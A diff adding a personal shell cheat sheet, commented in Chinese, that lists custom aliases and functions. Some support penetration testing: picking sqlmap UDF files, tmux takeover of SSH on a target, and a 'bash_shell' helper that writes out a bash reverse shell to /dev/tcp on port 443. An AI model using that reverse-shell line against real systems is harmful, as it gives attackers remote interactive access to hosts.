@@ -1,0 +1,37 @@
+% linux,tips
+
+; 用于提醒自己某个自定义函数或者别名的作用
+
+# zinit 的简写
+zi
+
+# 从 ${HOME}/dict 中获得一个字典的路径并且复制到剪切板
+pdict
+
+# 跳转到指定目录或者当前目录下的一个文件夹内
+cde <path_or_null>
+
+# 从 sqlmap 自带的 udf 文件中选择一个 udf 文件， 解压到当前目录下
+udf_pick
+
+# 编辑当前目录或者某个指定目录下的文件
+ef <path_or_null>
+
+# 获取当前的 wan_ip 保存到环境变量 WAN_IP 中
+wan_ip
+
+# 生成一个简单的反弹shell
+;echo "bash -i >& /dev/tcp/$LOCAL_IP/443 0>&1" > /tmp/temp_bash
+bash_shell
+
+# 将 wget 下载命令行复制到剪切板
+wget_echo <file_name>
+
+# 在目标机器上启用 tmux 接管 ssh
+ssht <ssh_options_like_common>
+
+# 查询 alias 的定义
+alias-search
+
+# 查询函数定义
+whence -f <function_name>
